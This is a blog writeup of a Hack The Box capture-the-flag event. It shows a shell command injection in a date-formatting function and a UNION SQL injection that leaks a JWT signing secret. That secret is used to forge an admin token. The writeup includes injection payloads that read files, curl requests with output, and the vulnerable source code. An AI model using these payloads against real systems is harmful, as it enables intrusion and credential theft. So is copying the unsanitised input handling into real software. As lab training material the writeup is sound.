---
layout: post
category: writeup
---


![](assets/images/usfbanner.webp)

![](assets/images/htb-ctf-usf-1st.png)

- HTB hosted a CTF locally here at USF under our business platform
- we got to participate and ended up being 1st!
- my writeup on the various challenges

### DeLorean Clock 

#### Dr. Brown wants to jump on the web 3.0 bandwagon and make his DeLorean controllable via blockchain! He made a web interface of the DeLorean time clock but launching the DeLorean to a miscalculated date can create a time paradox, the result of which could cause a chain reaction that would unravel the very fabric of the space-time continuum and destroy the entire universe! Can you test if the web interface is accurate and secure?

- this challenge was quite easy as there wasn't much to attack
- we were faced with a singular input that seems like it maps to `utils.py` in the provided files:

```
import subprocess, os
from application import main

generate = lambda x: os.urandom(x).hex()

def format_date(timestr):
    try:
        formatCMD = f'date -d "{timestr}" +"%h %d %Y %H %M"'
        formatDate = subprocess.getoutput(formatCMD)
    except:
        formatDate = 'Jan 01 1970 00 00'
    return formatDate
```

- that is an obvious command injection
- search other files and i don't see any sanitization so i can input something like this

```
$(find / -name flag.txt 2>/dev/null)
```

![](assets/images/htb-ctf-usf-find-flag.png)

- all is left is to read the flag

```
$(cat /app/flag.txt)
```

![](assets/images/htb-ctf-usf-deloeran-clock-flag.png)

- flag: `HTB{d0nt_p4ss_Us3r_Inpu7s_t0_c0mm4ndl1n3}`

### MadDog Memorial 

#### You have been tasked with the pentesting engagement on the memorial website of the great Buford "Mad Dog" Tannen, who was a true patriotic countryman and the pride of Hill Valley! The Tannen family has asked you to find out any loopholes in the system and see if the admin account can be compromised. They don't want any teenager or a mad scientist to break in and discover the secrets they are hiding!

- this was a much more fun challenge, it involved an interesting exploit chain
- it starts with understanding the database structure:

```
DEVKEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1)
PRODKEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1)

mysql -u root << EOF
CREATE DATABASE tannen_memorial;

CREATE TABLE tannen_memorial.keystore (
  kid int(11) NOT NULL AUTO_INCREMENT,
  secret varchar(255) NOT NULL,
  PRIMARY KEY (kid)
);

INSERT INTO tannen_memorial.keystore VALUES (1,'${DEVKEY}');
INSERT INTO tannen_memorial.keystore VALUES (2,'${PRODKEY}');
```

- this create a database called `tannen_memorial` and in that database it creates a table called `keystore`, in there it has `kid` and `secret`.
- from there it inserts completely random values into the keystore secrets
- the next thing we need to understand is the jwt implementation, that exists in the `JSTHelpers.js` file:

```
sign(data, kid='2') {
		return new Promise(async (resolve, reject) => {
			try {
                keyData = keyStore.filter(i => i.kid == kid)
                if(keyData.length === 0) reject();
                resolve(jwt.sign(data, keyData[0].secret, {
			        algorithm: 'HS256',
			        header: { kid: kid }
		        }));
            } catch (e) {
				reject(e);
			}
        });
	}
```
- this clearly shows that it grabs the secret from the keystore where kid = 2 and sets it as the jwt secret
- so in my head at this point, i'm thinking if there is any way i can read the database i can possibly get the secret and exploit the jwt token
- which takes us to `database.js`:

```
   async getPost(id) {
        return new Promise(async (resolve, reject) => {
            let stmt = `SELECT * FROM posts WHERE id='${id}'`;
            this.connection.query(stmt, (err, result) => {
                if(err)
                    reject(err)
                resolve(result)
            })
        });
    }
```
- this function has a clear and obvious sqli in the `/posts/:id` endpoint
- i'll try a union sqli and attempto read the secret, i already know the table and column nanme so all i'll need to do is find the column # count.

- start by curling the `/posts/1` endpoint

```
$ curl http://161.35.173.232:31576/posts/1 -s | grep card 
              <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                <div class="card-body pt-0">
                  <img class="card-img-top" src="/static/images/mad1.jpg" alt="Post unavailable!">
                  <h4 class="card-title mb-1">The Hero</h4>
                  <p class="card-text">Our Ancestor, Buford Tannen, was regarded as a hero for catching the thieves who robbed the Pine City Stage back in 1885. Although he was suspected of robbing the stagecoach earlier, he cleared his name later by identifying the real culprit. He guided the chief marshal to the house of a man named Seamus McFly, where they discovered a payroll from the stagecoach in the house. Hill valley recognized Buford as a hero for his assistance in finding the robbers.</p>
```

- i next try to union select 1 column:

```
$ curl http://161.35.173.232:31576/posts/\'union%20select%201--%20- -s | grep card 
              <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                <div class="card-body pt-0">
                  <h4 class="card-title">ERROR</h4>
                  <p class="card-text">Opps! Something went wrong!</p>
```

- that results in an error, so i'll start adding #'s until i get different feedback

```
$ curl http://161.35.173.232:31576/posts/\'union%20select%201,2,3,4--%20- -s | grep card  
              <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                <div class="card-body pt-0">
                  <img class="card-img-top" src="/static/images/3" alt="Post unavailable!">
                  <h4 class="card-title mb-1">2</h4>
                  <p class="card-text">4</p>
```

- this returns the values 2 and 4 as seen in the h4 and p tags
- i can now try to read a secret from the keystore values

```
$ curl http://161.35.173.232:31576/posts/\'union%20select%201,secret,3,4%20from%20keystore--%20- -s | grep card 
              <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                <div class="card-body pt-0">
                  <img class="card-img-top" src="/static/images/3" alt="Post unavailable!">
                  <h4 class="card-title mb-1">yEgEoSOKXmT50LM</h4>
                  <p class="card-text">4</p>
```

- bingo! i got a secret, this must be the dev secret aka kid 1 i can try and see if that works by editing it in jwt.io

![](assets/images/htb-ctf-usf-maddog-jwt.png)

- note that i change the kid to 1 and the secret key at the bottom to the correct value
- i take that cookie and i submit it in my browser -> refresh -> and read the flag on the main page!

![](assets/images/htb-ctf-usf-maddog-flag.png)


### 